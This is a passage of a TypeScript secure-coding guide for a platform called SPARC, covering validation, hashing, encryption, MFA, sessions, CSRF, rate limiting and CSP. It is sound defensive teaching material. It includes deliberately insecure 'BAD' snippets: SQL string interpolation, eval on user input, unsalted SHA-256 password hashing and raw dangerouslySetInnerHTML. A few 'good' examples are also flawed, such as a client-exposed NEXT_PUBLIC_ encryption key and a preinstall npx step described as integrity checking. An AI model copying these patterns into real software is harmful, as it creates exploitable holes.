# SPARC Security Best Practices Guide

## Table of Contents
- [Introduction](#introduction)
- [Secure Coding Guidelines](#secure-coding-guidelines)
- [Input Validation Requirements](#input-validation-requirements)
- [Authentication Best Practices](#authentication-best-practices)
- [Session Management](#session-management)
- [API Security Guidelines](#api-security-guidelines)
- [Frontend Security Practices](#frontend-security-practices)
- [Data Protection](#data-protection)
- [Security Testing](#security-testing)
- [Incident Response](#incident-response)

## Introduction

This guide provides comprehensive security best practices for developers, operators, and security professionals working on the SPARC platform. Following these guidelines ensures consistent security implementation across all components and helps prevent common vulnerabilities.

### Security Principles

1. **Defense in Depth**: Implement multiple layers of security controls
2. **Least Privilege**: Grant minimum necessary permissions
3. **Fail Secure**: Default to secure state on errors
4. **Zero Trust**: Never trust, always verify
5. **Security by Design**: Build security in from the start

## Secure Coding Guidelines

### 1. General Security Practices

#### Always Sanitize User Input
```typescript
// ❌ BAD: Direct use of user input
const query = `SELECT * FROM users WHERE name = '${req.body.name}'`;

// ✅ GOOD: Parameterized queries
const query = 'SELECT * FROM users WHERE name = $1';
const result = await db.query(query, [req.body.name]);

// ✅ BETTER: With validation
const schema = z.object({
  name: z.string().min(1).max(100).regex(/^[a-zA-Z0-9\s-]+$/)
});
const validated = schema.parse(req.body);
const result = await db.query(query, [validated.name]);
```

#### Secure Error Handling
```typescript
// ❌ BAD: Exposing internal details
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    sql: err.sql
  });
});

// ✅ GOOD: Safe error responses
app.use((err, req, res, next) => {
  // Log detailed error internally
  logger.error('Application error', {
    error: err,
    request: req.url,
    user: req.user?.id
  });
  
  // Send safe response to client
  if (err instanceof ValidationError) {
    res.status(400).json({
      error: 'Validation failed',
      fields: err.fields
    });
  } else {
    res.status(500).json({
      error: 'Internal server error',
      requestId: req.id
    });
  }
});
```

#### Secure Logging
```typescript
// ❌ BAD: Logging sensitive data
logger.info('User login', {
  username: user.email,
  password: credentials.password,
  creditCard: user.paymentInfo
});

// ✅ GOOD: Sanitized logging
logger.info('User login', {
  userId: user.id,
  username: user.email,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  // Never log passwords, tokens, or PII
});

// Implement log sanitization
export class SecureLogger {
  private sensitivePatterns = [
    /password["\s]*[:=]["\s]*[^",}\s]+/gi,
    /token["\s]*[:=]["\s]*[^",}\s]+/gi,
    /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g, // Credit cards
    /\b\d{3}-\d{2}-\d{4}\b/g // SSN
  ];
  
  log(level: string, message: string, data?: any) {
    const sanitized = this.sanitize(data);
    this.logger[level](message, sanitized);
  }
  
  private sanitize(data: any): any {
    const json = JSON.stringify(data);
    let sanitized = json;
    
    for (const pattern of this.sensitivePatterns) {
      sanitized = sanitized.replace(pattern, '[REDACTED]');
    }
    
    return JSON.parse(sanitized);
  }
}
```

### 2. Dependency Security

#### Package Management
```typescript
// package.json security practices
{
  "scripts": {
    // Audit dependencies regularly
    "security:audit": "npm audit --audit-level=moderate",
    "security:fix": "npm audit fix",
    
    // Lock dependency versions
    "postinstall": "npm ls --depth=0",
    
    // Verify package integrity
    "preinstall": "npx npm-check-updates"
  },
  "overrides": {
    // Override vulnerable transitive dependencies
    "lodash": "^4.17.21",
    "minimist": "^1.2.6"
  }
}

// Implement dependency checking in CI/CD
export const securityChecks = {
  preCommit: [
    "npm audit --audit-level=high",
    "npm run lint:security"
  ],
  preMerge: [
    "npm audit",
    "npx snyk test",
    "npx retire --severity high"
  ]
};
```

#### Secure Module Usage
```typescript
// ❌ BAD: Using eval or dynamic requires
const module = eval(`require('${userInput}')`);
const handler = require(userPath);

// ✅ GOOD: Whitelist allowed modules
const allowedModules = ['crypto', 'fs', 'path'];
if (allowedModules.includes(moduleName)) {
  const module = require(moduleName);
}

// ✅ BETTER: Import statically
import crypto from 'crypto';
import fs from 'fs/promises';
```

### 3. Cryptography Best Practices

#### Secure Random Generation
```typescript
// ❌ BAD: Weak randomness
const token = Math.random().toString(36);
const id = Date.now().toString();

// ✅ GOOD: Cryptographically secure
import { randomBytes, randomUUID } from 'crypto';

const token = randomBytes(32).toString('hex');
const id = randomUUID();

// For session tokens
export function generateSecureToken(length: number = 32): string {
  return randomBytes(length).toString('base64url');
}
```

#### Password Hashing
```typescript
// ❌ BAD: Weak hashing
const hash = crypto.createHash('sha256').update(password).digest('hex');

// ✅ GOOD: Strong hashing with salt
import bcrypt from 'bcrypt';

export class PasswordService {
  private readonly saltRounds = 12;
  
  async hashPassword(password: string): Promise<string> {
    // Validate password strength first
    this.validatePasswordStrength(password);
    return bcrypt.hash(password, this.saltRounds);
  }
  
  async verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
  
  private validatePasswordStrength(password: string): void {
    const requirements = [
      { regex: /.{12,}/, message: 'At least 12 characters' },
      { regex: /[A-Z]/, message: 'At least one uppercase letter' },
      { regex: /[a-z]/, message: 'At least one lowercase letter' },
      { regex: /[0-9]/, message: 'At least one number' },
      { regex: /[^A-Za-z0-9]/, message: 'At least one special character' }
    ];
    
    for (const req of requirements) {
      if (!req.regex.test(password)) {
        throw new ValidationError(`Password must contain: ${req.message}`);
      }
    }
  }
}
```

#### Encryption Implementation
```typescript
// ✅ GOOD: Proper encryption with authenticated encryption
import { createCipheriv, createDecipheriv, randomBytes, createHmac } from 'crypto';

export class EncryptionService {
  private algorithm = 'aes-256-gcm';
  private keyLength = 32;
  private ivLength = 16;
  private tagLength = 16;
  
  async encrypt(plaintext: string, key: Buffer): Promise<EncryptedData> {
    const iv = randomBytes(this.ivLength);
    const cipher = createCipheriv(this.algorithm, key, iv);
    
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    return {
      encrypted: encrypted.toString('base64'),
      iv: iv.toString('base64'),
      tag: tag.toString('base64'),
      algorithm: this.algorithm
    };
  }
  
  async decrypt(encryptedData: EncryptedData, key: Buffer): Promise<string> {
    const decipher = createDecipheriv(
      encryptedData.algorithm,
      key,
      Buffer.from(encryptedData.iv, 'base64')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.tag, 'base64'));
    
    const decrypted = Buffer.concat([
      decipher.update(Buffer.from(encryptedData.encrypted, 'base64')),
      decipher.final()
    ]);
    
    return decrypted.toString('utf8');
  }
}
```

## Input Validation Requirements

### 1. Validation Strategy

```typescript
// Comprehensive input validation using Zod
import { z } from 'zod';

// Define reusable validation schemas
export const validators = {
  // IDs
  uuid: z.string().uuid(),
  organizationId: z.string().uuid(),
  
  // User input
  email: z.string().email().toLowerCase(),
  username: z.string()
    .min(3)
    .max(30)
    .regex(/^[a-zA-Z0-9_-]+$/),
  
  // Security-sensitive
  password: z.string()
    .min(12)
    .max(128)
    .refine(val => /[A-Z]/.test(val), 'Must contain uppercase')
    .refine(val => /[a-z]/.test(val), 'Must contain lowercase')
    .refine(val => /[0-9]/.test(val), 'Must contain number')
    .refine(val => /[^A-Za-z0-9]/.test(val), 'Must contain special character'),
  
  // File uploads
  fileUpload: z.object({
    filename: z.string()
      .max(255)
      .regex(/^[a-zA-Z0-9._-]+$/),
    mimetype: z.enum(['image/jpeg', 'image/png', 'video/mp4']),
    size: z.number().max(100 * 1024 * 1024) // 100MB
  }),
  
  // API parameters
  pagination: z.object({
    page: z.number().int().positive().default(1),
    limit: z.number().int().positive().max(100).default(20),
    sort: z.enum(['asc', 'desc']).default('desc'),
    sortBy: z.string().regex(/^[a-zA-Z_]+$/).optional()
  }),
  
  // Search queries
  searchQuery: z.string()
    .max(200)
    .transform(val => val.trim())
    .refine(val => !/<[^>]*>/g.test(val), 'HTML not allowed')
};

// Validation middleware
export const validate = (schema: z.ZodSchema) => {
  return async (c: Context, next: Next) => {
    try {
      const data = await c.req.json();
      const validated = schema.parse(data);
      c.set('validatedData', validated);
      await next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        return c.json({
          error: 'Validation failed',
          details: error.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message
          }))
        }, 400);
      }
      throw error;
    }
  };
};
```

### 2. SQL Injection Prevention

```typescript
// ❌ BAD: String concatenation
const query = `SELECT * FROM users WHERE org_id = '${orgId}' AND name LIKE '%${search}%'`;

// ✅ GOOD: Parameterized queries with Drizzle ORM
import { db } from '@db';
import { users } from '@db/schema';
import { eq, and, like } from 'drizzle-orm';

// Safe query building
const result = await db.select()
  .from(users)
  .where(
    and(
      eq(users.organizationId, orgId),
      like(users.name, `%${search}%`)
    )
  );

// For complex queries, use prepared statements
const preparedQuery = db.select()
  .from(users)
  .where(eq(users.organizationId, sql.placeholder('orgId')))
  .prepare();

const result = await preparedQuery.execute({ orgId });
```

### 3. XSS Prevention

```typescript
// Frontend: React automatically escapes content
// ✅ GOOD: Safe by default
const UserProfile = ({ user }) => {
  return <div>{user.name}</div>; // Automatically escaped
};

// ❌ BAD: Bypassing React's protection
const UnsafeContent = ({ html }) => {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
};

// ✅ GOOD: Sanitize if HTML is needed
import DOMPurify from 'isomorphic-dompurify';

const SafeContent = ({ html }) => {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};

// API: Set proper content types
app.use((c, next) => {
  c.header('Content-Type', 'application/json; charset=utf-8');
  c.header('X-Content-Type-Options', 'nosniff');
  return next();
});
```

### 4. File Upload Security

```typescript
export class SecureFileUploadService {
  private allowedMimeTypes = new Set([
    'image/jpeg',
    'image/png',
    'image/gif',
    'video/mp4',
    'application/pdf'
  ]);
  
  private maxFileSize = 100 * 1024 * 1024; // 100MB
  
  async validateAndProcessUpload(file: File): Promise<ProcessedFile> {
    // 1. Validate file size
    if (file.size > this.maxFileSize) {
      throw new ValidationError('File too large');
    }
    
    // 2. Validate MIME type
    const detectedType = await this.detectMimeType(file);
    if (!this.allowedMimeTypes.has(detectedType)) {
      throw new ValidationError('File type not allowed');
    }
    
    // 3. Validate file extension
    const extension = path.extname(file.name).toLowerCase();
    if (!this.isExtensionAllowed(extension, detectedType)) {
      throw new ValidationError('File extension mismatch');
    }
    
    // 4. Scan for malware
    const scanResult = await this.scanForMalware(file);
    if (!scanResult.clean) {
      throw new SecurityError('File contains malware');
    }
    
    // 5. Generate safe filename
    const safeFilename = this.generateSafeFilename(file.name);
    
    // 6. Store in isolated location
    const storagePath = await this.storeSecurely(file, safeFilename);
    
    return {
      filename: safeFilename,
      path: storagePath,
      size: file.size,
      type: detectedType
    };
  }
  
  private async detectMimeType(file: File): Promise<string> {
    // Use magic bytes detection, not file extension
    const buffer = await file.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    
    // Check magic bytes for common formats
    if (bytes[0] === 0xFF && bytes[1] === 0xD8) return 'image/jpeg';
    if (bytes[0] === 0x89 && bytes[1] === 0x50) return 'image/png';
    if (bytes[0] === 0x47 && bytes[1] === 0x49) return 'image/gif';
    // ... more checks
    
    throw new ValidationError('Unknown file type');
  }
  
  private generateSafeFilename(originalName: string): string {
    const timestamp = Date.now();
    const random = randomBytes(8).toString('hex');
    const extension = path.extname(originalName).toLowerCase();
    return `${timestamp}_${random}${extension}`;
  }
}
```

## Authentication Best Practices

### 1. Multi-Factor Authentication (MFA)

```typescript
export class MFAService {
  // Time-based One-Time Password (TOTP) implementation
  async setupTOTP(userId: string): Promise<TOTPSetup> {
    // Generate secret
    const secret = authenticator.generateSecret();
    
    // Create QR code
    const otpauth = authenticator.keyuri(
      userId,
      'SPARC Security Platform',
      secret
    );
    const qrCode = await QRCode.toDataURL(otpauth);
    
    // Encrypt and store secret
    const encrypted = await this.encryptionService.encrypt(secret);
    await db.update(users)
      .set({ 
        mfaSecret: encrypted,
        mfaEnabled: false // Not enabled until verified
      })
      .where(eq(users.id, userId));
    
    return { qrCode, secret };
  }
  
  async verifyAndEnableTOTP(userId: string, token: string): Promise<boolean> {
    const user = await this.getUser(userId);
    const secret = await this.encryptionService.decrypt(user.mfaSecret);
    
    // Verify token
    const isValid = authenticator.verify({ token, secret });
    
    if (isValid) {
      // Enable MFA
      await db.update(users)
        .set({ mfaEnabled: true })
        .where(eq(users.id, userId));
      
      // Generate backup codes
      const backupCodes = await this.generateBackupCodes(userId);
      
      return true;
    }
    
    return false;
  }
  
  private async generateBackupCodes(userId: string): Promise<string[]> {
    const codes = Array.from({ length: 10 }, () => 
      randomBytes(4).toString('hex').toUpperCase()
    );
    
    // Hash and store backup codes
    const hashedCodes = await Promise.all(
      codes.map(code => bcrypt.hash(code, 10))
    );
    
    await db.insert(backupCodes).values(
      hashedCodes.map(hash => ({
        userId,
        code: hash,
        used: false
      }))
    );
    
    return codes;
  }
}
```

### 2. OAuth2/SAML Integration

```typescript
export class OAuthService {
  // OAuth2 configuration
  private providers = {
    google: {
      clientId: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
      authorizationURL: 'https://accounts.google.com/o/oauth2/v2/auth',
      tokenURL: 'https://oauth2.googleapis.com/token',
      scope: ['openid', 'email', 'profile']
    },
    azure: {
      clientId: process.env.AZURE_CLIENT_ID,
      clientSecret: process.env.AZURE_CLIENT_SECRET,
      authorizationURL: `https://login.microsoftonline.com/${process.env.AZURE_TENANT_ID}/oauth2/v2.0/authorize`,
      tokenURL: `https://login.microsoftonline.com/${process.env.AZURE_TENANT_ID}/oauth2/v2.0/token`,
      scope: ['openid', 'email', 'profile']
    }
  };
  
  async handleCallback(provider: string, code: string, state: string): Promise<AuthResult> {
    // Verify state to prevent CSRF
    const storedState = await this.cache.get(`oauth:state:${state}`);
    if (!storedState) {
      throw new SecurityError('Invalid state parameter');
    }
    
    // Exchange code for token
    const tokens = await this.exchangeCodeForTokens(provider, code);
    
    // Verify ID token
    const claims = await this.verifyIdToken(provider, tokens.id_token);
    
    // Check if user exists or create
    const user = await this.findOrCreateUser(provider, claims);
    
    // Generate session
    return this.createSession(user);
  }
  
  private async verifyIdToken(provider: string, idToken: string): Promise<any> {
    // Verify JWT signature and claims
    const config = this.providers[provider];
    const decoded = jwt.verify(idToken, config.publicKey, {
      audience: config.clientId,
      issuer: config.issuer,
      algorithms: ['RS256']
    });
    
    return decoded;
  }
}
```

### 3. Password Policies

```typescript
export const passwordPolicy = {
  minLength: 12,
  maxLength: 128,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true,
  preventCommonPasswords: true,
  preventUserInfo: true,
  expiryDays: 90,
  historyCount: 5,
  
  validate: async (password: string, user?: User): Promise<ValidationResult> => {
    const errors: string[] = [];
    
    // Length check
    if (password.length < passwordPolicy.minLength) {
      errors.push(`Password must be at least ${passwordPolicy.minLength} characters`);
    }
    
    // Complexity checks
    if (passwordPolicy.requireUppercase && !/[A-Z]/.test(password)) {
      errors.push('Password must contain uppercase letters');
    }
    
    // Common password check
    if (passwordPolicy.preventCommonPasswords) {
      const isCommon = await checkCommonPasswords(password);
      if (isCommon) {
        errors.push('Password is too common');
      }
    }
    
    // User info check
    if (passwordPolicy.preventUserInfo && user) {
      const userTokens = [
        user.email.split('@')[0],
        user.firstName,
        user.lastName,
        user.username
      ].filter(Boolean).map(s => s.toLowerCase());
      
      const passwordLower = password.toLowerCase();
      for (const token of userTokens) {
        if (passwordLower.includes(token)) {
          errors.push('Password cannot contain personal information');
          break;
        }
      }
    }
    
    // Password history check
    if (user) {
      const isReused = await checkPasswordHistory(user.id, password);
      if (isReused) {
        errors.push(`Cannot reuse last ${passwordPolicy.historyCount} passwords`);
      }
    }
    
    return {
      valid: errors.length === 0,
      errors
    };
  }
};
```

## Session Management

### 1. Secure Session Configuration

```typescript
export const sessionConfig = {
  secret: process.env.SESSION_SECRET,
  name: 'sparc_session',
  cookie: {
    httpOnly: true,
    secure: true, // HTTPS only
    sameSite: 'strict' as const,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    path: '/',
    domain: process.env.COOKIE_DOMAIN
  },
  rolling: true, // Reset expiry on activity
  resave: false,
  saveUninitialized: false,
  
  // Custom session store
  store: new RedisSessionStore({
    client: redisClient,
    prefix: 'session:',
    ttl: 24 * 60 * 60, // 24 hours
    disableTouch: false
  })
};

// Session security middleware
export class SessionSecurityMiddleware {
  async validateSession(c: Context, next: Next): Promise<void> {
    const session = c.get('session');
    
    if (!session) {
      throw new UnauthorizedError('No session');
    }
    
    // Check session validity
    if (this.isSessionExpired(session)) {
      await this.destroySession(session.id);
      throw new UnauthorizedError('Session expired');
    }
    
    // Check for session hijacking
    const fingerprint = this.generateFingerprint(c.req);
    if (session.fingerprint !== fingerprint) {
      await this.handleSuspiciousActivity(session, c.req);
      throw new SecurityError('Session security violation');
    }
    
    // Regenerate session ID periodically
    if (this.shouldRegenerateId(session)) {
      await this.regenerateSessionId(session);
    }
    
    await next();
  }
  
  private generateFingerprint(req: Request): string {
    // Create fingerprint from stable request properties
    const components = [
      req.headers['user-agent'],
      req.headers['accept-language'],
      req.headers['accept-encoding'],
      this.getClientIpRange(req) // IP range, not exact IP
    ];
    
    return crypto
      .createHash('sha256')
      .update(components.join('|'))
      .digest('hex');
  }
}
```

### 2. Token Management

```typescript
export class TokenService {
  // JWT configuration
  private accessTokenExpiry = '15m';
  private refreshTokenExpiry = '7d';
  private issuer = 'sparc.security';
  private audience = ['sparc-api', 'sparc-web'];
  
  async generateTokenPair(user: User, session: Session): Promise<TokenPair> {
    const tokenId = randomUUID();
    
    // Access token - short lived
    const accessToken = await this.generateAccessToken(user, session, tokenId);
    
    // Refresh token - long lived
    const refreshToken = await this.generateRefreshToken(user.id, tokenId);
    
    // Store token metadata
    await this.storeTokenMetadata(tokenId, user.id, session.id);
    
    return { accessToken, refreshToken };
  }
  
  private async generateAccessToken(
    user: User, 
    session: Session, 
    tokenId: string
  ): Promise<string> {
    const payload = {
      sub: user.id,
      iss: this.issuer,
      aud: this.audience,
      exp: Math.floor(Date.now() / 1000) + 900, // 15 minutes
      iat: Math.floor(Date.now() / 1000),
      jti: tokenId,
      
      // Custom claims
      user: {
        id: user.id,
        email: user.email,
        role: user.role,
        organizationId: user.organizationId
      },
      session: {
        id: session.id,
        ip: session.ip
      },
      permissions: await this.getUserPermissions(user)
    };
    
    return jwt.sign(payload, this.privateKey, { algorithm: 'RS256' });
  }
  
  async validateAccessToken(token: string): Promise<TokenValidation> {
    try {
      // Verify signature and standard claims
      const decoded = jwt.verify(token, this.publicKey, {
        issuer: this.issuer,
        audience: this.audience,
        algorithms: ['RS256']
      });
      
      // Check if token is revoked
      const isRevoked = await this.isTokenRevoked(decoded.jti);
      if (isRevoked) {
        throw new SecurityError('Token revoked');
      }
      
      // Validate session
      const session = await this.getSession(decoded.session.id);
      if (!session || session.revoked) {
        throw new SecurityError('Invalid session');
      }
      
      return {
        valid: true,
        claims: decoded,
        user: decoded.user,
        permissions: decoded.permissions
      };
    } catch (error) {
      if (error instanceof jwt.TokenExpiredError) {
        return { valid: false, reason: 'expired' };
      }
      return { valid: false, reason: 'invalid' };
    }
  }
}
```

### 3. CSRF Protection

```typescript
export class CSRFProtection {
  private tokenLength = 32;
  
  async generateToken(sessionId: string): Promise<string> {
    const token = randomBytes(this.tokenLength).toString('base64url');
    
    // Store token with session
    await this.cache.set(
      `csrf:${sessionId}`,
      token,
      { ttl: 3600 } // 1 hour
    );
    
    return token;
  }
  
  async validateToken(sessionId: string, token: string): Promise<boolean> {
    const storedToken = await this.cache.get(`csrf:${sessionId}`);
    
    if (!storedToken || !token) {
      return false;
    }
    
    // Constant-time comparison
    return crypto.timingSafeEqual(
      Buffer.from(storedToken),
      Buffer.from(token)
    );
  }
  
  // Middleware
  middleware() {
    return async (c: Context, next: Next) => {
      // Skip for safe methods
      if (['GET', 'HEAD', 'OPTIONS'].includes(c.req.method)) {
        return next();
      }
      
      const session = c.get('session');
      const token = c.req.header('X-CSRF-Token') || c.req.query('csrf_token');
      
      const isValid = await this.validateToken(session.id, token);
      if (!isValid) {
        throw new SecurityError('Invalid CSRF token');
      }
      
      await next();
    };
  }
}

// Double Submit Cookie Pattern (alternative)
export class DoubleSubmitCSRF {
  middleware() {
    return async (c: Context, next: Next) => {
      if (['GET', 'HEAD', 'OPTIONS'].includes(c.req.method)) {
        return next();
      }
      
      const headerToken = c.req.header('X-CSRF-Token');
      const cookieToken = c.req.cookie('csrf_token');
      
      if (!headerToken || !cookieToken || headerToken !== cookieToken) {
        throw new SecurityError('CSRF validation failed');
      }
      
      await next();
    };
  }
}
```

## API Security Guidelines

### 1. Rate Limiting

```typescript
export class RateLimiter {
  private limits: RateLimitConfig[] = [
    // Global limits
    { path: '*', window: 60, max: 100, keyBy: 'ip' },
    
    // Authentication endpoints
    { path: '/auth/login', window: 300, max: 5, keyBy: 'ip' },
    { path: '/auth/register', window: 3600, max: 3, keyBy: 'ip' },
    { path: '/auth/forgot-password', window: 3600, max: 3, keyBy: 'email' },
    
    // API endpoints - authenticated
    { path: '/api/*', window: 60, max: 1000, keyBy: 'user' },
    
    // Expensive operations
    { path: '/api/reports/generate', window: 3600, max: 10, keyBy: 'organization' },
    { path: '/api/video/process', window: 3600, max: 100, keyBy: 'organization' }
  ];
  
  async checkLimit(req: Request, config: RateLimitConfig): Promise<RateLimitResult> {
    const key = this.getKey(req, config);
    const current = await this.getCount(key);
    
    if (current >= config.max) {
      return {
        allowed: false,
        limit: config.max,
        remaining: 0,
        reset: this.getResetTime(key)
      };
    }
    
    await this.increment(key, config.window);
    
    return {
      allowed: true,
      limit: config.max,
      remaining: config.max - current - 1,
      reset: this.getResetTime(key)
    };
  }
  
  middleware() {
    return async (c: Context, next: Next) => {
      const config = this.getConfigForPath(c.req.path);
      const result = await this.checkLimit(c.req, config);
      
      // Set rate limit headers
      c.header('X-RateLimit-Limit', result.limit.toString());
      c.header('X-RateLimit-Remaining', result.remaining.toString());
      c.header('X-RateLimit-Reset', result.reset.toString());
      
      if (!result.allowed) {
        c.header('Retry-After', (result.reset - Date.now() / 1000).toString());
        return c.json({ error: 'Rate limit exceeded' }, 429);
      }
      
      await next();
    };
  }
}
```

### 2. API Versioning and Deprecation

```typescript
export class APIVersioning {
  private versions = {
    'v1': { deprecated: true, sunset: '2024-12-31' },
    'v2': { current: true },
    'v3': { beta: true }
  };
  
  middleware() {
    return async (c: Context, next: Next) => {
      const version = this.extractVersion(c.req);
      
      if (!this.versions[version]) {
        return c.json({ error: 'Invalid API version' }, 400);
      }
      
      const versionInfo = this.versions[version];
      
      // Add version headers
      c.header('API-Version', version);
      
      if (versionInfo.deprecated) {
        c.header('Deprecation', 'true');
        c.header('Sunset', versionInfo.sunset);
        c.header('Link', '</docs/api/v2>; rel="successor-version"');
      }
      
      if (versionInfo.beta) {
        c.header('API-Status', 'beta');
      }
      
      c.set('apiVersion', version);
      await next();
    };
  }
  
  private extractVersion(req: Request): string {
    // 1. Check URL path
    const pathMatch = req.path.match(/^\/api\/(v\d+)\//);
    if (pathMatch) return pathMatch[1];
    
    // 2. Check Accept header
    const accept = req.headers.get('Accept');
    const acceptMatch = accept?.match(/application\/vnd\.sparc\.(v\d+)\+json/);
    if (acceptMatch) return acceptMatch[1];
    
    // 3. Default to current version
    return 'v2';
  }
}
```

### 3. API Authentication

```typescript
export class APIAuthMiddleware {
  async authenticate(c: Context, next: Next): Promise<void> {
    // 1. Extract token
    const token = this.extractToken(c.req);
    if (!token) {
      return c.json({ error: 'No authentication token' }, 401);
    }
    
    // 2. Validate token type
    const tokenType = this.identifyTokenType(token);
    
    switch (tokenType) {
      case 'jwt':
        await this.validateJWT(c, token);
        break;
      case 'apiKey':
        await this.validateAPIKey(c, token);
        break;
      case 'oauth':
        await this.validateOAuthToken(c, token);
        break;
      default:
        return c.json({ error: 'Invalid token type' }, 401);
    }
    
    // 3. Check permissions
    const requiredPermission = this.getRequiredPermission(c.req);
    if (!this.hasPermission(c.get('user'), requiredPermission)) {
      return c.json({ error: 'Insufficient permissions' }, 403);
    }
    
    // 4. Audit log
    await this.auditLog({
      user: c.get('user'),
      action: c.req.method,
      resource: c.req.path,
      ip: c.req.ip
    });
    
    await next();
  }
  
  private extractToken(req: Request): string | null {
    // 1. Bearer token
    const auth = req.headers.get('Authorization');
    if (auth?.startsWith('Bearer ')) {
      return auth.substring(7);
    }
    
    // 2. API Key header
    const apiKey = req.headers.get('X-API-Key');
    if (apiKey) return apiKey;
    
    // 3. Query parameter (only for specific endpoints)
    if (this.allowQueryToken(req.path)) {
      return req.query('token');
    }
    
    return null;
  }
}
```

## Frontend Security Practices

### 1. Content Security Policy (CSP)

```typescript
export const cspConfig = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'nonce-{NONCE}'", // Dynamic nonce
      "https://cdn.jsdelivr.net", // Trusted CDN
      "'strict-dynamic'" // Allow trusted scripts to load others
    ],
    styleSrc: [
      "'self'",
      "'unsafe-inline'", // Required for styled-components
      "https://fonts.googleapis.com"
    ],
    imgSrc: [
      "'self'",
      "data:",
      "https:",
      "blob:"
    ],
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com"
    ],
    connectSrc: [
      "'self'",
      "wss://*.sparc.security", // WebSocket
      "https://api.sparc.security"
    ],
    mediaSrc: [
      "'self'",
      "blob:",
      "https://*.sparc.security" // Video streams
    ],
    objectSrc: ["'none'"],
    childSrc: ["'self'"],
    frameAncestors: ["'none'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: [],
    blockAllMixedContent: []
  },
  
  // Report violations
  reportUri: '/api/csp-report'
};

// CSP middleware with nonce generation
export const cspMiddleware = (req: Request, res: Response, next: Next) => {
  const nonce = randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  const policy = Object.entries(cspConfig.directives)
    .map(([key, values]) => {
      const directive = key.replace(/([A-Z])/g, '-$1').toLowerCase();
      const value = values.join(' ').replace('{NONCE}', nonce);
      return `${directive} ${value}`;
    })
    .join('; ');
  
  res.setHeader('Content-Security-Policy', policy);
  next();
};
```

### 2. Secure Component Patterns

```typescript
// Secure form handling
export const SecureForm: React.FC<{ onSubmit: (data: any) => void }> = ({ onSubmit }) => {
  const [csrfToken] = useCSRFToken();
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    // Validate all inputs
    const formData = new FormData(e.target as HTMLFormElement);
    const validated = await validateFormData(formData);
    
    // Include CSRF token
    validated.csrf_token = csrfToken;
    
    // Submit with proper error handling
    try {
      await onSubmit(validated);
    } catch (error) {
      // Handle errors securely
      handleSecureError(error);
    }
  };
  
  return (
    <form onSubmit={handleSubmit} autoComplete="off">
      <input type="hidden" name="csrf_token" value={csrfToken} />
      {/* Form fields */}
    </form>
  );
};

// Secure data display
export const SecureDataDisplay: React.FC<{ data: any }> = ({ data }) => {
  // Sanitize data before display
  const sanitized = useMemo(() => {
    return sanitizeData(data, {
      stripHTML: true,
      escapeSpecialChars: true,
      maxLength: 1000
    });
  }, [data]);
  
  return <div>{sanitized}</div>;
};

// Secure external links
export const SecureLink: React.FC<{ href: string; children: ReactNode }> = ({ 
  href, 
  children 
}) => {
  const isExternal = !href.startsWith('/') && !href.startsWith('#');
  
  if (isExternal) {
    return (
      <a 
        href={href}
        target="_blank"
        rel="noopener noreferrer nofollow"
        onClick={(e) => {
          // Warn about external navigation
          if (!confirm('You are leaving SPARC. Continue?')) {
            e.preventDefault();
          }
        }}
      >
        {children}
        <ExternalLinkIcon />
      </a>
    );
  }
  
  return <Link href={href}>{children}</Link>;
};
```

### 3. Secure State Management

```typescript
// Secure Redux store
import { configureStore } from '@reduxjs/toolkit';
import { encryptTransform } from 'redux-persist-transform-encrypt';

export const secureStore = configureStore({
  reducer: rootReducer,
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware({
      serializableCheck: {
        // Ignore these paths for serialization checks
        ignoredPaths: ['auth.token', 'user.sensitive']
      }
    }).concat([
      // Security middleware
      authenticationMiddleware,
      auditLogMiddleware,
      sensitiveDataProtectionMiddleware
    ]),
  
  // Encrypt sensitive data in localStorage
  preloadedState: loadEncryptedState(),
  enhancers: [
    persistStateEnhancer({
      transforms: [
        encryptTransform({
          secretKey: process.env.NEXT_PUBLIC_STATE_ENCRYPTION_KEY,
          onError: (error) => {
            console.error('State encryption error', error);
          }
        })
      ],
      blacklist: ['temp', 'ui'] // Don't persist these
    })
  ]
});

// Middleware to protect sensitive data
const sensitiveDataProtectionMiddleware: Middleware = (store) => (next) => (action) => {
  // Redact sensitive data from actions
  if (action.type.includes('auth/')) {
    action = redactSensitiveFields(action, ['password', 'token', 'secret']);
  }
  
  // Prevent sensitive data in dev tools
  if (process.env.NODE_ENV === 'development') {
    console.log('Action:', { ...action, payload: '[REDACTED]' });
  }
  
  return next(action);
};
```

### 4. Secure API Communication

```typescript
// Secure API client
export class SecureAPIClient {
  private baseURL = process.env.NEXT_PUBLIC_API_URL;
  private timeout = 30000;
  
  async request<T>(
    endpoint: string,
    options: RequestOptions = {}
  ): Promise<T> {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), this.timeout);
    
    try {
      // Build secure headers
      const headers = await this.buildSecureHeaders(options.headers);
      
      // Make request
      const response = await fetch(`${this.baseURL}${endpoint}`, {
        ...options,
        headers,
        credentials: 'include', // Include cookies
        signal: controller.signal,
        // Prevent MIME sniffing
        mode: 'cors',
        // Referrer policy
        referrerPolicy: 'strict-origin-when-cross-origin'
      });
      
      // Validate response
      this.validateResponse(response);
      
      // Parse response safely
      const data = await this.parseResponse<T>(response);
      
      return data;
    } catch (error) {
      throw this.handleError(error);
